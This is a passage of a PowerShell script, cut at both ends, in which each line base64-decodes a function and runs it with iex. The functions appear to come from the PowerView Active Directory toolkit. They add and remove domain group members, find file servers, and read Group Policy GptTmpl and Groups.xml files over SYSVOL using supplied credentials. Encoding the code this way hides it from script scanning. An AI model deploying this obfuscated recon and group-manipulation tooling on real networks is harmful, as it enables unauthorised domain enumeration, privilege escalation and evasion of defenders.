gICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnTGFzdE9yaWdpbmF0aW5nRHNhRE4nICRUZW1wT2JqZWN0LnBzekxhc3RPcmlnaW5hdGluZ0RzYUROCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkRvbWFpbkdyb3VwTWVtYmVyRGVsZXRlZCcpCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyRGVsZXRlZF0gRXJyb3IgcmV0cmlldmluZyAnbXNkcy1yZXBsdmFsdWVtZXRhZGF0YScgZm9yICckT2JqZWN0RE4nIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWRkLURvbWFpbkdyb3VwTWVtYmVyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cElkZW50aXR5JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ01lbWJlcklkZW50aXR5JywgJ01lbWJlcicsICdEaXN0aW5ndWlzaGVkTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkTWVtYmVycywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQ29udGV4dEFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdJZGVudGl0eScgPSAkSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnRleHRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEdyb3VwQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICAgICAgaWYgKCRHcm91cENvbnRleHQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRHcm91cCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuR3JvdXBQcmluY2lwYWxdOjpGaW5kQnlJZGVudGl0eSgkR3JvdXBDb250ZXh0LkNvbnRleHQsICRHcm91cENvbnRleHQuSWRlbnRpdHkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0FkZC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkR3JvdXApIHsKICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlciBpbiAkTWVtYmVycykgewogICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIgLW1hdGNoICcuK1xcLisnKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnRleHRBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgJFVzZXJDb250ZXh0ID0gR2V0LVByaW5jaXBhbENvbnRleHQgQENvbnRleHRBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICBpZiAoJFVzZXJDb250ZXh0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VySWRlbnRpdHkgPSAkVXNlckNvbnRleHQuSWRlbnRpdHkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVXNlckNvbnRleHQgPSAkR3JvdXBDb250ZXh0CiAgICAgICAgICAgICAgICAgICAgJFVzZXJJZGVudGl0eSA9ICRNZW1iZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltBZGQtRG9tYWluR3JvdXBNZW1iZXJdIEFkZGluZyBtZW1iZXIgJyRNZW1iZXInIHRvIGdyb3VwICckSWRlbnRpdHknIgogICAgICAgICAgICAgICAgJE1lbWJlciA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuUHJpbmNpcGFsXTo6RmluZEJ5SWRlbnRpdHkoJFVzZXJDb250ZXh0LkNvbnRleHQsICRVc2VySWRlbnRpdHkpCiAgICAgICAgICAgICAgICAkR3JvdXAuTWVtYmVycy5BZGQoJE1lbWJlcikKICAgICAgICAgICAgICAgICRHcm91cC5TYXZlKCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gUmVtb3ZlLURvbWFpbkdyb3VwTWVtYmVyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cElkZW50aXR5JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ01lbWJlcklkZW50aXR5JywgJ01lbWJlcicsICdEaXN0aW5ndWlzaGVkTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkTWVtYmVycywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQ29udGV4dEFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdJZGVudGl0eScgPSAkSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnRleHRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEdyb3VwQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICAgICAgaWYgKCRHcm91cENvbnRleHQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRHcm91cCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuR3JvdXBQcmluY2lwYWxdOjpGaW5kQnlJZGVudGl0eSgkR3JvdXBDb250ZXh0LkNvbnRleHQsICRHcm91cENvbnRleHQuSWRlbnRpdHkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW1JlbW92ZS1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkR3JvdXApIHsKICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlciBpbiAkTWVtYmVycykgewogICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIgLW1hdGNoICcuK1xcLisnKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnRleHRBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgJFVzZXJDb250ZXh0ID0gR2V0LVByaW5jaXBhbENvbnRleHQgQENvbnRleHRBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICBpZiAoJFVzZXJDb250ZXh0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VySWRlbnRpdHkgPSAkVXNlckNvbnRleHQuSWRlbnRpdHkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVXNlckNvbnRleHQgPSAkR3JvdXBDb250ZXh0CiAgICAgICAgICAgICAgICAgICAgJFVzZXJJZGVudGl0eSA9ICRNZW1iZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltSZW1vdmUtRG9tYWluR3JvdXBNZW1iZXJdIFJlbW92aW5nIG1lbWJlciAnJE1lbWJlcicgZnJvbSBncm91cCAnJElkZW50aXR5JyIKICAgICAgICAgICAgICAgICRNZW1iZXIgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRVc2VyQ29udGV4dC5Db250ZXh0LCAkVXNlcklkZW50aXR5KQogICAgICAgICAgICAgICAgJEdyb3VwLk1lbWJlcnMuUmVtb3ZlKCRNZW1iZXIpCiAgICAgICAgICAgICAgICAkR3JvdXAuU2F2ZSgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkZpbGVTZXJ2ZXIgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtTdHJpbmddKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5OYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgZnVuY3Rpb24gU3BsaXQtUGF0aCB7CiAgICAgICAgICAgIFBhcmFtKFtTdHJpbmddJFBhdGgpCiAgICAgICAgICAgIGlmICgkUGF0aCAtYW5kICgkUGF0aC5zcGxpdCgnXFwnKS5Db3VudCAtZ2UgMykpIHsKICAgICAgICAgICAgICAgICRUZW1wID0gJFBhdGguc3BsaXQoJ1xcJylbMl0KICAgICAgICAgICAgICAgIGlmICgkVGVtcCAtYW5kICgkVGVtcCAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgJFRlbXAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnTERBUEZpbHRlcicgPSAnKCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KSghKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKSkofChob21lZGlyZWN0b3J5PSopKHNjcmlwdHBhdGg9KikocHJvZmlsZXBhdGg9KikpKScKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2hvbWVkaXJlY3Rvcnksc2NyaXB0cGF0aCxwcm9maWxlcGF0aCcKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldERvbWFpbiBpbiAkRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFRhcmdldERvbWFpbgogICAgICAgICAgICAgICAgJFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICQoRm9yRWFjaCgkVXNlclJlc3VsdCBpbiAkVXNlclNlYXJjaGVyLkZpbmRBbGwoKSkge2lmICgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydob21lZGlyZWN0b3J5J10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ2hvbWVkaXJlY3RvcnknXSl9aWYgKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3NjcmlwdHBhdGgnXSkge1NwbGl0LVBhdGgoJFVzZXJSZXN1bHQuUHJvcGVydGllc1snc2NyaXB0cGF0aCddKX1pZiAoJFVzZXJSZXN1bHQuUHJvcGVydGllc1sncHJvZmlsZXBhdGgnXSkge1NwbGl0LVBhdGgoJFVzZXJSZXN1bHQuUHJvcGVydGllc1sncHJvZmlsZXBhdGgnXSl9fSkgfCBTb3J0LU9iamVjdCAtVW5pcXVlCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRVc2VyU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICQoRm9yRWFjaCgkVXNlclJlc3VsdCBpbiAkVXNlclNlYXJjaGVyLkZpbmRBbGwoKSkge2lmICgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydob21lZGlyZWN0b3J5J10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ2hvbWVkaXJlY3RvcnknXSl9aWYgKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3NjcmlwdHBhdGgnXSkge1NwbGl0LVBhdGgoJFVzZXJSZXN1bHQuUHJvcGVydGllc1snc2NyaXB0cGF0aCddKX1pZiAoJFVzZXJSZXN1bHQuUHJvcGVydGllc1sncHJvZmlsZXBhdGgnXSkge1NwbGl0LVBhdGgoJFVzZXJSZXN1bHQuUHJvcGVydGllc1sncHJvZmlsZXBhdGgnXSl9fSkgfCBTb3J0LU9iamVjdCAtVW5pcXVlCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUdwdFRtcGwgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtIYXNodGFibGVdKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ2dwY2ZpbGVzeXNwYXRoJywgJ1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcHRUbXBsUGF0aCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRPdXRwdXRPYmplY3QsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJE1hcHBlZFBhdGhzID0gQHt9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoKCRHcHRUbXBsUGF0aCAtTWF0Y2ggJ1xcXFwuKlxcLionKSAtYW5kICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkpIHsKICAgICAgICAgICAgICAgICRTeXNWb2xQYXRoID0gIlxcJCgoTmV3LU9iamVjdCBTeXN0ZW0uVXJpKCRHcHRUbXBsUGF0aCkpLkhvc3QpXFNZU1ZPTCIKICAgICAgICAgICAgICAgIGlmICgtbm90ICRNYXBwZWRQYXRoc1skU3lzVm9sUGF0aF0pIHsKICAgICAgICAgICAgICAgICAgICBBZGQtUmVtb3RlQ29ubmVjdGlvbiAtUGF0aCAkU3lzVm9sUGF0aCAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICRNYXBwZWRQYXRoc1skU3lzVm9sUGF0aF0gPSAkVHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRUYXJnZXRHcHRUbXBsUGF0aCA9ICRHcHRUbXBsUGF0aAogICAgICAgICAgICBpZiAoLW5vdCAkVGFyZ2V0R3B0VG1wbFBhdGguRW5kc1dpdGgoJy5pbmYnKSkgewogICAgICAgICAgICAgICAgJFRhcmdldEdwdFRtcGxQYXRoICs9ICdcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5mJwogICAgICAgICAgICB9CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtR3B0VG1wbF0gUGFyc2luZyBHcHRUbXBsUGF0aDogJFRhcmdldEdwdFRtcGxQYXRoIgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydPdXRwdXRPYmplY3QnXSkgewogICAgICAgICAgICAgICAgJENvbnRlbnRzID0gR2V0LUluaUNvbnRlbnQgLVBhdGggJFRhcmdldEdwdFRtcGxQYXRoIC1PdXRwdXRPYmplY3QgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgICAgIGlmICgkQ29udGVudHMpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udGVudHMgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUGF0aCcgJFRhcmdldEdwdFRtcGxQYXRoCiAgICAgICAgICAgICAgICAgICAgJENvbnRlbnRzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkQ29udGVudHMgPSBHZXQtSW5pQ29udGVudCAtUGF0aCAkVGFyZ2V0R3B0VG1wbFBhdGggLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgICAgIGlmICgkQ29udGVudHMpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udGVudHNbJ1BhdGgnXSA9ICRUYXJnZXRHcHRUbXBsUGF0aAogICAgICAgICAgICAgICAgICAgICRDb250ZW50cwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1HcHRUbXBsXSBFcnJvciBwYXJzaW5nICRUYXJnZXRHcHRUbXBsUGF0aCA6ICRfIgogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgJE1hcHBlZFBhdGhzLktleXMgfCBGb3JFYWNoLU9iamVjdCB7IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICRfIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUdyb3Vwc1hNTCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Hcm91cHNYTUwnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cHNYTUxQYXRoLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRNYXBwZWRQYXRocyA9IEB7fQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCgkR3JvdXBzWE1MUGF0aCAtTWF0Y2ggJ1xcXFwuKlxcLionKSAtYW5kICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkpIHsKICAgICAgICAgICAgICAgICRTeXNWb2xQYXRoID0gIlxcJCgoTmV3LU9iamVjdCBTeXN0ZW0uVXJpKCRHcm91cHNYTUxQYXRoKSkuSG9zdClcU1lTVk9MIgogICAgICAgICAgICAgICAgaWYgKC1ub3QgJE1hcHBlZFBhdGhzWyRTeXNWb2xQYXRoXSkgewogICAgICAgICAgICAgICAgICAgIEFkZC1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICRTeXNWb2xQYXRoIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgICAgICAgICAgJE1hcHBlZFBhdGhzWyRTeXNWb2xQYXRoXSA9ICRUcnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgW1hNTF0kR3JvdXBzWE1MY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRHcm91cHNYTUxQYXRoIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgICAgICRHcm91cHNYTUxjb250ZW50IHwgU2VsZWN0LVhtbCAiL0dyb3Vwcy9Hcm91cCIgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBub2RlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEdyb3VwbmFtZSA9ICRfLlByb3BlcnRpZXMuZ3JvdXBOYW1lCiAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAkXy5Qcm9wZXJ0aWVzLmdyb3VwU2lkCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkR3JvdXBTSUQpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJEdyb3VwbmFtZSAtbWF0Y2ggJ0FkbWl